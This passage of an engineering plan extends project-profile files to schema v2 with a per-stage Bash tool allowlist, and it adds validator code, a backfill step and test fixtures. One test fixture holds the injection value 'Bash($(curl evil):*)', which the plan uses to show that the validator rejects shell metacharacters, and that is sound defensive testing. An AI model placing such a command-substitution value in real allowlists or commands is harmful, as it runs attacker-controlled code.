            print "are implicit and not declared here."
            print ""
            print "- brainstorming: (none)"
            print "- planning: (none)"
            print "- implementing:"
            print "  - <<NEEDS-INPUT: which Bash patterns does the implementing stage need? List one per line, e.g. Bash(cargo:*) — see bin/setup-prompts/discovery.md derivation rule.>>"
            print "- ui:"
            print "  - <<NEEDS-INPUT: which Bash patterns does the ui stage need?>>"
            print "- reviewing: (none)"
            print "- qa:"
            print "  - <<NEEDS-INPUT: which Bash patterns does the qa stage need?>>"
            print "- building: (none)"
            print "- released: (none)"
            print ""
            injected=1
          }
          { print }
        ' "$path" | atomic_write_file "$path"
      }
      ```

- [ ] Verify syntax: `bash -n bin/setup-helpers.sh` exits 0.
- [ ] Smoke: in a sandbox, copy a valid v1 fixture, run
      `_inject_tool_allowlist_section <path>`, assert the result file
      has `schema_version: 2` in frontmatter, contains the literal
      heading `## Tool allowlist` between `## Build & test gates`
      and `## File layout`, and contains exactly three
      `<<NEEDS-INPUT:` lines.

### Task 4: Branch `_validate_project_profile_schema` on schema_version (D-6 + D-7)

- `depends_on: [2]`
- `touches: bin/setup-helpers.sh::_validate_project_profile_schema (replace lines 141-157)`
- [ ] Replace lines 141-157 of `_validate_project_profile_schema` with a
      `case "$version"` ladder. Lines 128-139 (function signature +
      frontmatter check) stay verbatim. New block:

      ```bash
        # Read schema version (empty = missing / malformed).
        local version
        version="$(_profile_schema_version "$path")"
        if [[ -z "$version" ]]; then
          printf '_validate_project_profile_schema: schema_version missing\n' >&2
          return 1
        fi

        local sections expected
        case "$version" in
          1)
            sections="$(grep -E '^## ' "$path" | head -5 | tr '\n' '|')"
            expected='## Stack|## Build & test gates|## File layout|## Language idioms|## Don'\''ts|'
            if [[ "$sections" != "$expected" ]]; then
              printf '_validate_project_profile_schema: schema_version=1 expected sections [%s], got [%s]\n' \
                "$expected" "$sections" >&2
              return 1
            fi
            return 0
            ;;
          2)
            sections="$(grep -E '^## ' "$path" | head -6 | tr '\n' '|')"
            expected='## Stack|## Build & test gates|## Tool allowlist|## File layout|## Language idioms|## Don'\''ts|'
            if [[ "$sections" != "$expected" ]]; then
              if ! grep -qE '^## Tool allowlist$' "$path"; then
                printf '_validate_project_profile_schema: schema_version=2 but missing ## Tool allowlist\n' >&2
              else
                printf '_validate_project_profile_schema: schema_version=2 expected sections [%s], got [%s]\n' \
                  "$expected" "$sections" >&2
              fi
              return 1
            fi
            # D-7: pattern-shape gate. Walk lines under `## Tool allowlist`
            # until the next `^## ` heading; for each line carrying a
            # backtick-fenced `Bash(...)` pattern, assert the shape.
            local bad_line
            bad_line="$(awk '
              /^## Tool allowlist$/ { in_sec=1; next }
              in_sec && /^## / { exit }
              in_sec && /`Bash\(/ {
                if ($0 !~ /^[[:space:]]*-?[[:space:]]*`Bash\([A-Za-z0-9_./[:space:]:-]+:\*\)`/) {
                  print NR ":" $0
                  exit
                }
              }
            ' "$path")"
            if [[ -n "$bad_line" ]]; then
              printf '_validate_project_profile_schema: pattern at line %s has shell metacharacters: %s\n' \
                "${bad_line%%:*}" "${bad_line#*:}" >&2
              return 1
            fi
            return 0
            ;;
          *)
            printf '_validate_project_profile_schema: unsupported schema_version: %s\n' "$version" >&2
            return 1
            ;;
        esac
      }
      ```

- [ ] Verify syntax: `bash -n bin/setup-helpers.sh` exits 0.
- [ ] Run `bash bin/setup-helpers-test.sh` — case-1.1, 1.2, 1.4, 1.5
      continue passing on the v1 path; case-1.3 will fail until Task 6
      updates its label/assertion (expected — that test edit is
      coupled to this validator change).

### Task 5: Insert v1→v2 backfill branch in `phase_project_profile`

- `depends_on: [3, 4]`
- `touches: bin/setup.sh::phase_project_profile (insert between lines 264 and 266)`
- [ ] In `bin/setup.sh`, between line 264 (`mkdir -p "$profile_dir"`)
      and line 266 (`# Skip-discovery rule: file exists with valid schema and no markers → done.`),
      insert:

      ```bash
        # ENG-93: v1 → v2 backfill. Existing valid v1 profile, no markers, but
        # missing the new ## Tool allowlist section. Inject the section with
        # NEEDS-INPUT markers and bump schema_version to 2; the line-275
        # marker-resolution branch below picks it up next conditional check.
        # MUST run BEFORE the line-273 "complete" check; otherwise v1
        # profiles return early and never get upgraded.
        if [[ -f "$profile_path" ]] \
           && _validate_project_profile_schema "$profile_path" 2>/dev/null \
           && ! grep -q '<<NEEDS-INPUT:' "$profile_path" \
           && [[ "$(_profile_schema_version "$profile_path")" == "1" ]]; then
          log "project-profile: detected v1 profile at $profile_path"
          log "project-profile: upgrading to v2 (Tool allowlist) — 3 prompts will follow"
          log "project-profile: Ctrl-C now to defer; file is NOT mutated until you continue"
          _inject_tool_allowlist_section "$profile_path" \
            || die "project-profile: v1→v2 backfill failed (file unchanged via atomic_write)"
          # fall through to line-275 marker-resolution branch
        fi
      ```

- [ ] Verify syntax: `bash -n bin/setup.sh` exits 0.
- [ ] Verify ordering: the new block lands BEFORE the line-273
      `if [[ -f "$profile_path" ]] && _validate_project_profile_schema
      ... && ! grep -q '<<NEEDS-INPUT:`. After the block, the next
      conditional in source order is the line-273 "complete" check
      (which falls through because the file now contains markers),
      then line-275 "valid + has markers → resolve" (which fires).

### Task 6: Update `setup-helpers-test.sh` case-1.3 + add v2 cases

- `depends_on: [4]`
- `touches: bin/setup-helpers-test.sh (modify lines 77-83; append cases 1.6, 1.7, 1.8 after line 103)`
- [ ] Replace lines 77-83 with:

      ```bash
      # Case 1.3: unsupported schema_version → fails with explicit message
      sed 's/schema_version: 1/schema_version: 99/' "$sandbox/good.md" > "$sandbox/bad-version.md"
      if err="$(_validate_project_profile_schema "$sandbox/bad-version.md" 2>&1)"; then
        fail_at "case-1.3: unsupported schema_version rejected" "returned 0"
      else
        if grep -q 'unsupported schema_version' <<<"$err"; then
          pass_at "case-1.3: unsupported schema_version rejected"
        else
          fail_at "case-1.3: unsupported schema_version rejected" "stderr=$err"
        fi
      fi
      ```

- [ ] After the existing case-1.5 block (line 103), append case-1.6
      (v2 happy path):

      ```bash
      # Case 1.6: v2 happy path → returns 0
      cat > "$sandbox/v2-good.md" <<'PROFILE'
      ---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test

      ## Stack
      bash.

      ## Build & test gates
      - Build: `(n/a)`
      - Test: `bash bin/foo-test.sh`
      - Lint/check: `(n/a)`
      - Integration/E2E: `(n/a)`

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(bash bin/foo-test.sh:*)`
      - ui: (none)
      - reviewing: (none)
      - qa:
        - `Bash(bash bin/foo-test.sh:*)`
      - building: (none)
      - released: (none)

      ## File layout
      - `bin/` — scripts.

      ## Language idioms
      - snake_case.

      ## Don'ts
      (none observed)
      PROFILE
      if _validate_project_profile_schema "$sandbox/v2-good.md"; then
        pass_at "case-1.6: v2 happy path passes"
      else
        fail_at "case-1.6: v2 happy path passes" "rc=$?"
      fi
      ```

- [ ] Append case-1.7 (v2 missing Tool allowlist) — copy v2-good.md,
      delete the `## Tool allowlist` block, assert validator rejects with
      stderr containing the literal substring
      `schema_version=2 but missing ## Tool allowlist`. Use awk or
      `sed -e '/^## Tool allowlist$/,/^## File layout$/{ /^## File layout$/!d; }'`
      style filter.
- [ ] Append case-1.8 (v2 with shell-metachar pattern) — copy v2-good.md,
      replace one `Bash(bash bin/foo-test.sh:*)` line with
      `Bash($(curl evil):*)`, assert validator rejects with stderr
      containing the literal substring
      `pattern at line` and `shell metacharacters`.
- [ ] Run `bash bin/setup-helpers-test.sh` — all eight cases (1.1
      through 1.8) plus the existing _resolve_profile_markers and
      _render_discovery_prompt cases pass; final summary shows
      `FAIL: 0`.

### Task 7: Add v2 fixtures + cases to `phase-project-profile-test.sh`

- `depends_on: [3, 4, 5]`
- `touches: bin/phase-project-profile-test.sh (append 6 new fixture variables after line 98; append 7 new cases after line 172)`
- [ ] Append after the existing `INVALID_PROFILE` definition at line 98:

      ```bash
      # ENG-93: v2 fixtures across three stack shapes plus two version paths.
      V2_RUST_TAURI_PROFILE='---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test (Rust + Bun)

      ## Stack
      Tauri v2 + SvelteKit.

      ## Build & test gates
      - Build: `bun run build`
      - Test: `cargo test --workspace`
      - Lint/check: `bun run check && cargo clippy`
      - Integration/E2E: `bunx playwright test`

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(cargo:*)`
        - `Bash(bun:*)`
        - `Bash(rustc:*)`
      - ui:
        - `Bash(cargo:*)`
        - `Bash(bun:*)`
        - `Bash(npx:*)`
        - `Bash(node:*)`
      - reviewing: (none)
      - qa:
        - `Bash(cargo:*)`
        - `Bash(bun:*)`
        - `Bash(npx:*)`
        - `Bash(node:*)`
      - building: (none)
      - released: (none)

      ## File layout
      - `crates/` — Rust workspace.
      - `src/` — SvelteKit frontend.

      ## Language idioms
      - Svelte 5 runes.
      - cargo workspace, resolver = "2".

      ## Don'\''ts
      (none observed)
      '

      V2_PYTHON_PYTEST_PROFILE='---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test (Python + pytest)

      ## Stack
      Python 3.11, FastAPI, pytest.

      ## Build & test gates
      - Build: `(n/a) — interpreted`
      - Test: `pytest -q`
      - Lint/check: `ruff check && mypy .`
      - Integration/E2E: `(n/a)`

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(python:*)`
        - `Bash(pytest:*)`
        - `Bash(pip:*)`
        - `Bash(ruff:*)`
        - `Bash(mypy:*)`
      - ui: (none)
      - reviewing: (none)
      - qa:
        - `Bash(python:*)`
        - `Bash(pytest:*)`
      - building: (none)
      - released: (none)

      ## File layout
      - `src/` — Python source.
      - `tests/` — pytest suite.

      ## Language idioms
      - snake_case.
      - dataclasses.

      ## Don'\''ts
      (none observed)
      '

      V2_GO_GOTEST_PROFILE='---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test (Go)

      ## Stack
      Go 1.22, standard toolchain.

      ## Build & test gates
      - Build: `go build ./...`
      - Test: `go test ./...`
      - Lint/check: `golangci-lint run`
      - Integration/E2E: `(n/a)`

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(go:*)`
        - `Bash(golangci-lint:*)`
      - ui: (none)
      - reviewing: (none)
      - qa:
        - `Bash(go:*)`
      - building: (none)
      - released: (none)

      ## File layout
      - `cmd/` — main entrypoints.
      - `internal/` — internal packages.

      ## Language idioms
      - CamelCase exported, camelCase unexported.

      ## Don'\''ts
      (none observed)
      '

      V1_LEGACY_PROFILE="$GOOD_PROFILE"

      V2_MISSING_TOOL_ALLOWLIST='---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test

      ## Stack
      bash.

      ## Build & test gates
      - Build: `(n/a)`
      - Test: `bash bin/foo-test.sh`
      - Lint/check: `(n/a)`
      - Integration/E2E: `(n/a)`

      ## File layout
      - `bin/` — scripts.

      ## Language idioms
      - snake_case.

      ## Don'\''ts
      (none observed)
      '

      V2_BAD_PATTERN_PROFILE='---
      slug: test-slug
      generated_at: 2026-04-27T00:00:00Z
      generated_by: discovery-agent
      schema_version: 2
      ---

      # Project profile — Test

      ## Stack
      bash.

      ## Build & test gates
      - Build: `(n/a)`
      - Test: `bash bin/foo-test.sh`
      - Lint/check: `(n/a)`
      - Integration/E2E: `(n/a)`

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash($(curl evil):*)`
      - ui: (none)
      - reviewing: (none)
      - qa: (none)
      - building: (none)
      - released: (none)

      ## File layout
      - `bin/` — scripts.

      ## Language idioms
      - snake_case.

      ## Don'\''ts
      (none observed)
      '
      ```

- [ ] Append after the existing case-5.4 block (line 172, before
      line 174 summary), seven new cases:

      - **case-5.5 (V2 Rust+Bun happy path):** `write_claude_stub` with
        `V2_RUST_TAURI_PROFILE`; `run_phase ""` exits 0; assert the
        resulting file passes `_validate_project_profile_schema` and
        contains `^## Tool allowlist$`.
      - **case-5.6 (V2 Python+pytest happy path):** same shape with
        `V2_PYTHON_PYTEST_PROFILE`.
      - **case-5.7 (V2 Go+go-test happy path):** same shape with
        `V2_GO_GOTEST_PROFILE`.
      - **case-5.8 (V1 → V2 backfill mutation, marker-resolution
        deliberately aborts):** seed
        `$sandbox/harness-root/learned-rules/test-slug/project-profile.md`
        with `V1_LEGACY_PROFILE`; `rm -f "$sandbox/stubs/claude"` (no
        re-discovery permitted); feed `$'\n\n\n\n'` to stdin so the
        marker-resolution loop aborts on 3-empty-retries (returns 1,
        `phase_project_profile` dies). The assertion targets only the
        intermediate state: `_inject_tool_allowlist_section` ran via
        the new D-5 branch and atomic-wrote v2-with-markers BEFORE
        the marker-resolution failure. Because `atomic_write_file`
        (`bin/setup-helpers.sh:32-35`) renames the tempfile into place,
        the partial mutation persists on disk. The case-5.11 follow-up
        case below covers the happy-path marker resolution. Concrete:

        ```bash
        # case-5.8: V1 → V2 backfill, no claude re-invocation.
        rm -f "$sandbox/harness-root/learned-rules/test-slug/project-profile.md"
        printf '%s' "$V1_LEGACY_PROFILE" > "$sandbox/harness-root/learned-rules/test-slug/project-profile.md"
        rm -f "$sandbox/stubs/claude"
        # Feed exactly one blank line so _resolve_profile_markers's
        # first read fails fast and aborts after the 3-empty-retry
        # threshold (we only care that backfill mutated the file).
        if run_phase $'\n\n\n\n' >/dev/null 2>&1; then
          : # may pass (markers all answered with same blank — they won't be)
        fi
        if grep -q '^schema_version: 2$' "$sandbox/harness-root/learned-rules/test-slug/project-profile.md" \
           && grep -q '^## Tool allowlist$' "$sandbox/harness-root/learned-rules/test-slug/project-profile.md"; then
          pass_at "case-5.8: v1→v2 backfill injected new section + bumped version"
        else
          fail_at "case-5.8: v1→v2 backfill" "$(cat "$sandbox/harness-root/learned-rules/test-slug/project-profile.md")"
        fi
        ```

      - **case-5.9 (V2 missing Tool allowlist → die):** `write_claude_stub`
        with `V2_MISSING_TOOL_ALLOWLIST`; `run_phase ""` returns
        non-zero; the resulting file is removed (matching the case-5.4
        `die` semantic).
      - **case-5.10 (V2 bad-pattern profile → die):** `write_claude_stub`
        with `V2_BAD_PATTERN_PROFILE`; `run_phase ""` returns non-zero;
        the resulting file is removed.
      - **case-5.11 (end-to-end V1→V2 backfill with successful marker
        resolution):** seed v1 profile; `rm -f "$sandbox/stubs/claude"`;
        feed three answers via stdin (`'Bash(cargo:*)\nBash(npx:*)\nBash(cargo:*)\n'`);
        assert the resulting file is at `schema_version: 2`, contains
        all six v2 sections in order (`grep -E '^## ' | head -6`
        output equals the v2 expected), and contains the literal
        `Bash(cargo:*)` answer pattern under `## Tool allowlist`.

- [ ] Run `bash bin/phase-project-profile-test.sh` — all 11 cases pass;
      final summary shows `FAIL: 0`.

### Task 8: Upgrade `learned-rules/harness/project-profile.md` to v2

- `depends_on: [3, 4, 5]`
- `touches: learned-rules/harness/project-profile.md (line 5; insert section between lines 19 and 21)`

The brainstorm §6 names dogfooding the backfill helper as the
**Preferred path** and hand-edit as Fallback. Honor that order.

**Preferred path (dogfood the backfill helper):**

- [ ] On the implementer's host (where the gitignored
      `$TARGET_REPO/.pipeline-config/config.json` is readable), run:
      `TARGET_REPO=/Users/rajatgoyal/code/twinning-harness bash bin/setup.sh project-profile`.
      The new D-5 backfill branch (Task 5) detects the v1 file at
      `learned-rules/harness/project-profile.md`, logs the upgrade
      intent, and prompts for three answers
      (implementing / ui / qa Bash patterns).
- [ ] Source-of-truth for the answers: `cat
      "$TARGET_REPO/.pipeline-config/config.json" | jq -r
      '.dispatch.tools.implementing[]'` and `... .qa[]`. Copy each
      array's literal patterns (e.g. `Bash(bash bin/foo-test.sh:*)`).
      For `ui`, harness-self has no UI surface — answer `(none)`
      (the operator can resolve a NEEDS-INPUT to the literal string
      `(none)`; the marker line is replaced verbatim with the answer,
      so the resulting line reads `  - (none)` which the validator
      tolerates because the pattern-shape regex is only run on lines
      that contain a backtick-fenced `Bash(...)` pattern — see Task 4
      D-7 walker condition `in_sec && /\`Bash\\(/`).
- [ ] **`_resolve_profile_markers` answer-shape constraint (design
      P1).** Each `<<NEEDS-INPUT:>>` marker resolves to **one line**;
      the operator's answer replaces the marker but the line's prefix
      (`  - `) is preserved. For multi-pattern stages (every
      stack-aware case in practice), the implementer MUST hand-edit
      the file AFTER the dogfooded backfill to add the second and
      subsequent patterns as additional `  - \`Bash(...:*)\`` bullets
      under the relevant stage. Treat the helper-driven backfill as
      "first pattern populated; remaining patterns hand-appended."
      This limitation is documented inline as a follow-up note in the
      committed v2 file (a brief HTML comment immediately above the
      `## Tool allowlist` section is acceptable; alternatively, a
      one-line entry in `## Don'ts` warning future operators that
      multi-pattern stages need a hand-edit pass after the
      backfill helper runs).
- [ ] Once the helper exits cleanly and `_validate_project_profile_schema`
      passes (the helper itself runs validation as the last step of
      `phase_project_profile`), commit the upgraded
      `learned-rules/harness/project-profile.md` on the feature
      branch.

**Fallback path** (only if Task 5's backfill helper is broken or the
gitignored `.pipeline-config/config.json` is unreadable from the
implementer's environment):

- [ ] At line 5, change `schema_version: 1` → `schema_version: 2`.
- [ ] Source the patterns from `ls bin/*-test.sh | sort` (this matches
      what the regen one-liner in CLAUDE.md "Per-target dispatch.tools
      extras" produces; the result is identical to the
      config.json content) and emit one `Bash(bash bin/<name>:*)`
      pattern per match plus the two non-test entries (`Bash(bash
      .githooks/pre-commit:*)`, `Bash(bash bin/secret-probe-lint.sh:*)`).
- [ ] Insert immediately after line 19 (close of `## Build & test gates`)
      and before line 21 (`## File layout`):

      ```markdown

      ## Tool allowlist

      Per-stage Bash patterns the orchestrator grants to `claude -p` at dispatch.
      Stage-agnostic core tools (Read, Write, Edit, Grep, Glob, TaskCreate,
      git family, `bash bin/linear.sh`, `bash bin/pipeline.sh`,
      `bash bin/guards.sh`, `bash bin/slack.sh`, `bash bin/metrics.sh`)
      are implicit and not declared here.

      - brainstorming: (none)
      - planning: (none)
      - implementing:
        - `Bash(bash .githooks/pre-commit:*)`
        - `Bash(bash bin/secret-probe-lint.sh:*)`
        - `Bash(bash bin/<each-bin/*-test.sh enumerated>:*)`
      - ui: (none)
      - reviewing: (none)
      - qa:
        - `Bash(bash .githooks/pre-commit:*)`
        - `Bash(bash bin/secret-probe-lint.sh:*)`
        - `Bash(bash bin/<each-bin/*-test.sh enumerated>:*)`
      - building: (none)
      - released: (none)
      ```

      The implementer enumerates `ls bin/*-test.sh | sort` at
      implementation time and inlines one
      `Bash(bash bin/<name>:*)` line per match. Order is alphabetical
      to mirror the `sort` step in the regen one-liner; this minimizes
      churn when new tests are added (alphabetical insertion).
- [ ] Verify: `bash -c '
        source bin/common.sh 2>/dev/null || true
        source bin/setup-helpers.sh
        _validate_project_profile_schema learned-rules/harness/project-profile.md
      '` returns 0.
- [ ] Verify: `_profile_schema_version learned-rules/harness/project-profile.md`
      returns `2`.
- [ ] Verify: `grep -c '^- ` `learned-rules/harness/project-profile.md`
      shows ≥ 13 enumerated bullets under `## Tool allowlist` (eight
      stage-headers + at least five sub-bullets across implementing /
      qa). The exact count depends on how many `bin/*-test.sh` exist
      at implementation time.

### Task 9: Cross-suite verification

- `depends_on: [1, 2, 3, 4, 5, 6, 7, 8]`
- `touches: (no edits — verification only)`
- [ ] Run `bash bin/phase-project-profile-test.sh` — exits 0,
      `FAIL: 0`, all 11 cases pass.
- [ ] Run `bash bin/setup-helpers-test.sh` — exits 0, `FAIL: 0`.
- [ ] Run `bash bin/render-prompt-test.sh` — exits 0 (cases 6.1–6.5
      use v1 fixtures and continue passing because v1 is still valid).
- [ ] Run `bash bin/install-launchd-test.sh` — exits 0 (the v1 fixture
      at line 50 is still valid).
- [ ] Run `bash -n bin/setup-helpers.sh && bash -n bin/setup.sh
      && bash -n bin/setup-prompts/discovery.md` — first two exit 0
      (third is a markdown file, skip; included for paranoia, the
      `bash -n` returns rc=0 on a markdown file too because no shell
      syntax is parsed — but harmless).
- [ ] Run `bash bin/secret-probe-lint.sh` — exits 0 (no new
      `${VAR:-FALLBACK}` constructs introduced; the new helpers use
      `[[ -f "$path" ]]` and `local foo="${1}"` style).
- [ ] Run a smoke verification of the harness-self profile:
      ```
      bash -c '
        cd /Users/rajatgoyal/.local/state/twinning-harness/harness/ENG-93/worktree
        source bin/setup-helpers.sh
        _validate_project_profile_schema learned-rules/harness/project-profile.md
        printf "rc=%d\n" $?
        printf "version="; _profile_schema_version learned-rules/harness/project-profile.md
      '
      ```
      The output must contain `rc=0` and `version=2`.
- [ ] **PR-description payload** (operator-facing — product P2): the PR
      description MUST call out the expected `render-prompt.sh:151`
      "schema_version != 1" warning that fires on every dispatch
      against a v2 profile. Suggested wording:

      > **Expected non-fatal warning during the T1→T2 window.** After
      > this PR, every dispatch on a v2 profile emits
      > `render-prompt: WARNING — project-profile schema_version != 1,
      > continuing` to the per-stage transcript. This is informational;
      > dispatch behavior is unchanged. T2 (the dispatch-side rewire)
      > will relax the regex to accept `1` or `2`. Do not read this
      > warning as a regression.

## Frontend Tasks

(no UI surface — this is a bash orchestration repo. The harness has no
frontend. Per the project profile's "## Stack" section: "Bash 3.2+
orchestration scripts (macOS-compatible). The repo contains no
application code.")

## Failure Mode → Test Map

The brainstorm's §9 enumerates seven edge cases (E-1 through E-7) and
§7.4 enumerates six validation-failure shapes. Each row below maps to
a concrete test name; QA will assert this exact mapping.

| Failure mode | Trigger | Expected behavior | Test layer | Test name |
|---|---|---|---|---|
| `schema_version: 1` valid v1 file with original 5 sections | discovery emits v1 (legacy operator) or backfill not yet run | Validator returns 0 (back-compat) | unit | `bin/setup-helpers-test.sh::case-1.1` (existing, retained) |
| `schema_version: 99` (or any non-1, non-2 integer) | typo in hand-edit; corrupt frontmatter | Validator returns 1 with stderr `unsupported schema_version: 99` | unit | `bin/setup-helpers-test.sh::case-1.3` (updated) |
| `schema_version` missing from frontmatter | hand-edited file with `schema_version` line deleted | Validator returns 1 with stderr `schema_version missing` | unit | `bin/setup-helpers-test.sh::case-1.3-missing` (new — sub-case appended to case-1.3 block) |
| `schema_version: 2` valid v2 file with all 6 sections | discovery emits v2 OR backfill resolved markers | Validator returns 0 | unit | `bin/setup-helpers-test.sh::case-1.6` (new) + `bin/phase-project-profile-test.sh::case-5.5/5.6/5.7` (new — Rust+Bun, Python+pytest, Go+go-test) |
| `schema_version: 2` but missing `## Tool allowlist` section | discovery agent forgot the section; hand-edit removed it | Validator returns 1 with stderr `schema_version=2 but missing ## Tool allowlist` | unit | `bin/setup-helpers-test.sh::case-1.7` (new) + `bin/phase-project-profile-test.sh::case-5.9` (new) |
| `schema_version: 2` with shell-metachar pattern (`Bash($(curl evil):*)` etc.) | malicious or accidental injection in hand-edit | Validator returns 1 with stderr `pattern at line N has shell metacharacters` | unit | `bin/setup-helpers-test.sh::case-1.8` (new) + `bin/phase-project-profile-test.sh::case-5.10` (new) |
| Missing frontmatter at top of file | corrupt file; discovery never ran | Validator returns 1 with stderr `missing frontmatter` | unit | `bin/setup-helpers-test.sh::case-1.2` (existing, retained) |
| v2 sections present but out of order | hand-edit moved sections | Validator returns 1 with stderr `schema_version=2 expected sections [...]` | unit | `bin/setup-helpers-test.sh::case-1.5` (existing — covers v1; reused logic by the new v2 ordered match) |
| v1 profile detected on setup, no markers, schema_version=1 (E-3 backfill trigger) | operator runs `bash bin/setup.sh project-profile` against existing pre-ENG-93 profile | New backfill branch in `phase_project_profile` injects `## Tool allowlist` with markers + bumps to v2; falls through to marker resolution | integration | `bin/phase-project-profile-test.sh::case-5.8` (new — backfill mutation only) + `case-5.11` (new — end-to-end with successful marker answers) |
| v1 profile lacks `## Build & test gates` heading (E-4 corrupt v1) | corrupt v1 with the anchor heading deleted | `_inject_tool_allowlist_section` returns 1 with stderr `missing anchor "## Build & test gates"`; `phase_project_profile` dies | unit | `bin/phase-project-profile-test.sh::case-5.12-corrupt-v1` (new — recommended; minimal cost; assert the helper's rc=1 + die path) |
| Operator Ctrl-Cs during marker resolution after v1→v2 backfill (E-3) | typed Ctrl-C between stdin reads | Profile remains at `schema_version: 2` with `<<NEEDS-INPUT:>>` markers; next setup run takes the line-275 "valid + has markers" branch | integration | `bin/phase-project-profile-test.sh::case-5.11-resume` (new sub-case; first run with 0 stdin lines aborts; second run with 3 stdin lines resolves) |
| `render-prompt.sh:151` warning fires on v2 profile (E-2 informational regression) | every dispatch on a v2 profile emits the non-fatal warning | Existing `render-prompt-test.sh` cases 6.1–6.5 continue passing on v1 fixtures; v2 emits warning to stderr (non-fatal); no test asserts the warning text (deferred to T2) | smoke | `bin/render-prompt-test.sh::case-6.1` (existing; v1 fixture; passes unchanged). Manual verification: run dispatch with `learned-rules/harness/project-profile.md` post-Task-8; transcript shows the warning line; documented in PR description |
| Discovery agent emits malformed-shape `Bash(cargo)` (no `:*`) — E-5 | discovery output | ENG-93 does NOT validate pattern shape beyond shell-metachar gate (D-7); `Bash(cargo)` fails the regex shape `Bash(...:*)` and is rejected. T2's runtime parser also fails closed | unit | `bin/setup-helpers-test.sh::case-1.8` (new — existing test for the shell-metachar regex; same regex covers the trailing `:*` requirement because the shape regex's literal `:\*\)` requires it) |

## Test Strategy

The test surface is unit-heavy because the change is data-shape and
validator-shape, both of which are exercised by direct file-fixture +
function-call assertions. The integration layer covers the
backfill-end-to-end path (case-5.8, case-5.11), where the test
sources `setup.sh::phase_project_profile` and walks the branch ordering
in source.

### Unit (`bin/setup-helpers-test.sh`)

- Validator branching: v1 / v2 / unsupported / missing version
  (cases 1.1, 1.3, 1.4, 1.5, 1.6, 1.7).
- Pattern-shape gate (case 1.8) — D-7 defense-in-depth.
- Existing marker-resolution and prompt-render tests (cases 2.x, 3.x)
  remain unchanged and continue to pass.

### Unit (`bin/phase-project-profile-test.sh`)

- Three v2 happy paths covering the three stack shapes named in
  acceptance criterion #4 (Rust+Bun, Python+pytest, Go+go-test) — cases
  5.5, 5.6, 5.7.
- v2 reject paths (cases 5.9, 5.10) — missing Tool allowlist, bad
  pattern shape.
- Backfill mutation-only and end-to-end cases (5.8, 5.11) — branch
  ordering, atomic write, marker injection, marker resolution.
- Optional case-5.12 (corrupt v1) — defensive, low-cost; flagged in
  the failure-mode map as recommended.

### Integration

The phase_project_profile test cases are integration tests (the test
sources `setup.sh` and exercises the function-level branching), but
they avoid network / subprocess `claude` calls via the existing
stub-claude pattern. No new integration layer is introduced.

### Smoke

The cross-suite verification step (Task 9) runs the full
`bash bin/<name>-test.sh` suite plus a manual smoke against the
upgraded `learned-rules/harness/project-profile.md`. The harness-self
profile validation IS the smoke test for the v2 schema in production
shape.

### Adversarial coverage

- `Bash($(curl evil):*)` — D-7 metachar regex (case 1.8 / case 5.10).
- `Bash(cargo)` (no trailing `:*`) — caught by the same shape regex
  via the literal `:\*\)` requirement.
- `Bash(“which which”:*)` (smart quotes) — caught by the
  ASCII-only character class in the shape regex.
- v1 profile that someone hand-edited to add `## Tool allowlist`
  without bumping the version — E-1; the v1 branch's `head -5`
  ordered match rejects (the 6th section pushes Don'ts off the
  expected position). Covered structurally by case-1.5 logic.
- v2 profile with all 6 sections present but in wrong order — E-1
  inverse. The v2 branch's `head -6` ordered match rejects. **Not
  covered by an explicit fixture in this plan**; this is a small
  coverage gap given the v2 ordered-match logic is structurally
  identical to v1 modulo the `5→6` count + the slot-3 insertion
  (case-1.5 already covers v1 out-of-order). The gap is documented
  here so a future ENG ticket can append the fixture if the gap
  becomes load-bearing. Note that case-5.9 (`V2_MISSING_TOOL_ALLOWLIST`)
  exercises the early `! grep -qE '^## Tool allowlist$'` branch
  (Task 4), not the generic ordered-match — so it is NOT a substitute
  for an out-of-order v2 fixture.

### Out of test scope (deferred to T2)

- Dispatch-time consumption of the new section (the
  `dispatch.sh::allowed_tools_for` rewire).
- The `render-prompt.sh:151` warning regex relaxation (E-2 — fires on
  every v2 dispatch as informational; documented in PR description).
- Removal of `.pipeline-config/config.json::dispatch.tools[]` (T2).
- `run-local-helpers.sh` / `scope-check.sh` Tauri-vocab cleanup
  (T3 / T4).
